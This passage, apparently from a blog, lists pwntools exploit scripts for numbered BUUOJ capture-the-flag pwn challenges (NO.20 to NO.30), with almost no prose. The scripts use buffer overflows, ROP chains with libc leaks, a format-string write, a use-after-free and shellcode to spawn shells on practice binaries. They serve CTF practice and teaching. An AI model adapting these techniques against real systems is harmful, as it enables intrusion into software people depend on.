class="line">p.sendafter(&#39;What do you want to say to me?&#39;,payload+&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.20 ciscn_2019_s_3_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;ciscn_2019_s_3&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,25585)</span><br><span class="line">elf &#x3D; ELF(&#39;ciscn_2019_s_3&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">main &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line">#main&#x3D;0x0004004ED</span><br><span class="line">execv &#x3D; 0x04004E2</span><br><span class="line">pop_rdi &#x3D; 0x4005a3</span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 &#x3D; 0x40059A</span><br><span class="line">mov_rdxr13_call &#x3D; 0x0400580 </span><br><span class="line">syscall &#x3D; 0x00400517</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\00&#39;*2 + p64(main)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(0x20)</span><br><span class="line">binsh_addr &#x3D; u64(p.recv(8)) - 0x138</span><br><span class="line">print(hex(binsh_addr))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh\00&#39;*2 + p64(pop_rbx_rbp_r12_r13_r14_r15) </span><br><span class="line">payload +&#x3D; p64(0)+p64(0)+p64(binsh_addr+0x50)</span><br><span class="line">payload +&#x3D; p64(0)+p64(0)+p64(0)</span><br><span class="line">payload +&#x3D; p64(mov_rdxr13_call)+p64(execv)</span><br><span class="line">payload +&#x3D; p64(pop_rdi)+p64(binsh_addr)+p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.21 jarvisoj_level2_x64 _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;jarvisoj_level2_x64&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27721)</span><br><span class="line">#elf &#x3D; ELF(&#39;&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x00000000004006b3</span><br><span class="line">system_addr &#x3D; 0x040063E</span><br><span class="line"></span><br><span class="line">system_addr1 &#x3D; 0x004004C0</span><br><span class="line">binsh_addr &#x3D; 0x0600A90</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x80+8)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.22 [HarekazeCTF2019]baby_rop2 _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;[HarekazeCTF2019]baby_rop2&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29812)</span><br><span class="line">elf &#x3D; ELF(&#39;[HarekazeCTF2019]baby_rop2&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">main &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line">read_got &#x3D; elf.got[&#39;read&#39;]</span><br><span class="line">read_plt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line">format_str&#x3D;0x400770  #%s</span><br><span class="line">pop_rdi &#x3D; 0x0000000000400733</span><br><span class="line">pop_rsi_r15 &#x3D; 0x0000000000400731</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x28) +p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;? &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">read_addr &#x3D; u64(p.recvuntil(&quot;\x7f&quot;).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print hex(read_addr)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;read&#39;,read_addr)</span><br><span class="line">offset &#x3D; read_addr - libc.dump(&#39;read&#39;)</span><br><span class="line">system &#x3D; offset + libc.dump(&#39;system&#39;)</span><br><span class="line">binsh &#x3D; offset + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">offset &#x3D; read_addr - libc.sym[&#39;read&#39;]</span><br><span class="line">system &#x3D; libc.sym[&#39;system&#39;] + offset</span><br><span class="line">binsh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()+offset</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x28)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.recvuntil(&#39;? &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.23 ciscn_2019_ne_5 _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;ciscn_2019_ne_5&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,25921)</span><br><span class="line">elf &#x3D; ELF(&#39;ciscn_2019_ne_5&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">system &#x3D; elf.plt[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">sh_addr &#x3D; 0x080482EA</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x48+4)+p32(system)+p32(0xdeadbeef)+p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Please input admin password:&#39;)</span><br><span class="line">p.sendline(&#39;administrator&#39;)</span><br><span class="line">p.recvuntil(&#39;0.Exit\n&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recvuntil(&#39;:&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;0.Exit\n&#39;)</span><br><span class="line">p.sendline(&#39;4&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.24 pwn2_sctf_2016 _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;pwn2_sctf_2016&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26427)</span><br><span class="line">elf &#x3D; ELF(&#39;pwn2_sctf_2016&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc&#x2F;ubuntu16&#x2F;32&#x2F;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">atoi_got &#x3D; elf.got[&#39;atoi&#39;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line">main_addr &#x3D; elf.symbols[&#39;main&#39;]</span><br><span class="line">format_addr &#x3D; 0x080486F8</span><br><span class="line"></span><br><span class="line">def send(payload):</span><br><span class="line">	p.recvuntil(&#39;How many bytes do you want me to read? &#39;)</span><br><span class="line">	p.sendline(str(-1))</span><br><span class="line">	p.recvuntil(&#39;data!\n&#39;)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x2c+4)+p32(printf_plt)+p32(main_addr)+p32(format_addr)+p32(atoi_got)</span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;You said: &#39;)</span><br><span class="line">p.recvuntil(&#39;You said: &#39;)</span><br><span class="line">atoi_addr &#x3D; u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">offset &#x3D;  atoi_addr - libc.sym[&#39;atoi&#39;]</span><br><span class="line">system &#x3D; libc.sym[&#39;system&#39;]+offset</span><br><span class="line">binsh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()+offset</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x2c+4)+p32(system)+p32(0xdeefdedf)+p32(binsh)</span><br><span class="line">send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.25 ez_pz_hackover_2016 _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;ez_pz_hackover_2016&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29304)</span><br><span class="line">#elf &#x3D; ELF(&#39;ez_pz_hackover_2016&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Yippie, lets crash: &#39;)</span><br><span class="line">s_addr &#x3D; int(p.recv(10), 16)</span><br><span class="line">p.recvuntil(&#39;&gt; &#39;)</span><br><span class="line"></span><br><span class="line">#print(hex(s_addr))</span><br><span class="line">payload &#x3D; &#39;crashme\x00&#39;+&#39;\x00&#39;*(26-8)+p32(s_addr-0x1c) + asm(shellcraft.sh())</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.26 ciscn_2019_es_2_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;ciscn_2019_es_2&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26426)</span><br><span class="line">elf &#x3D; ELF(&#39;ciscn_2019_es_2&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_plt &#x3D; elf.plt[&#39;system&#39;]</span><br><span class="line">vuln &#x3D; 0x08048595</span><br><span class="line">hack &#x3D; 0x0804854B</span><br><span class="line">leave &#x3D; 0x080484B8</span><br><span class="line">payload &#x3D; &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">payload &#x3D; payload.ljust(0x27,&#39;a&#39;) </span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(0x2f)</span><br><span class="line">ebp_addr &#x3D; u32(p.recv(4)) - 0x38</span><br><span class="line"></span><br><span class="line">print &quot;ebd_addr &#x3D;&gt;&quot; , hex(ebp_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;bbbb&#39;+ p32(system_plt) +&#39;cccc&#39;+p32(ebp_addr+0x10)+&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">payload &#x3D; payload.ljust(0x28,&#39;d&#39;)</span><br><span class="line">payload +&#x3D; p32(ebp_addr)+p32(leave)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.27 jarvisoj_level3_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;jarvisoj_level3&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28355)</span><br><span class="line">elf &#x3D; ELF(&#39;jarvisoj_level3&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line">main &#x3D; elf.sym[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#print hex(len(payload))</span><br><span class="line">p.recvuntil(&#39;Input:\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr &#x3D; u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">#print hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line"></span><br><span class="line">offset &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">system &#x3D; libc.dump(&#39;system&#39;) + offset</span><br><span class="line">binsh &#x3D; libc.dump(&#39;str_bin_sh&#39;) + offset</span><br><span class="line">payload  &#x3D; &#39;a&#39;*(0x88+4)+p32(system)+p32(main)+p32(binsh)</span><br><span class="line">p.recvuntil(&#39;\n&#39;) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.28 [BJDCTF 2nd]ydsneedgirlfriend2_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;[BJDCTF 2nd]ydsneedgirlfriend2&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26424)</span><br><span class="line">elf &#x3D; ELF(&#39;[BJDCTF 2nd]ydsneedgirlfriend2&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">def add(size,context):</span><br><span class="line">    p.recvuntil(&quot;u choice :\n&quot;)</span><br><span class="line">    p.sendline(str(1))</span><br><span class="line">    p.recvuntil(&quot;Please input the length of her name:\n&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;Please tell me her name:\n&quot;)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.recvuntil(&quot;u choice :\n&quot;)</span><br><span class="line">    p.sendline(str(2))</span><br><span class="line">    p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.recvuntil(&quot;u choice :\n&quot;)</span><br><span class="line">    p.sendline(str(3))</span><br><span class="line">    p.recvuntil(&quot;Index :&quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor &#x3D; 0x400D86</span><br><span class="line"></span><br><span class="line">add(0x20,&quot;a&quot;*0x10)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(0x10,p64(0)+p64(backdoor))</span><br><span class="line">show(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.29 jarvisoj_fm _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;jarvisoj_fm&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27403)</span><br><span class="line">#elf &#x3D; ELF(&#39;&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">x &#x3D; 0x0804A02C</span><br><span class="line"></span><br><span class="line">payload &#x3D; p32(x)+&quot;%11$n&quot; #fmtstr_payload(offset,&#123;x:pad&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.30 [BJDCTF 2nd]r2t4 _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;[BJDCTF 2nd]r2t4&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26399)</span><br><span class="line">elf &#x3D; ELF(&#39;[BJDCTF 2nd]r2t4&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">backdoor &#x3D; 0x00400626</span><br><span class="line">bss &#x3D; 0x0601050</span><br><span class="line">leave &#x3D; 0x004006BA</span><br><span 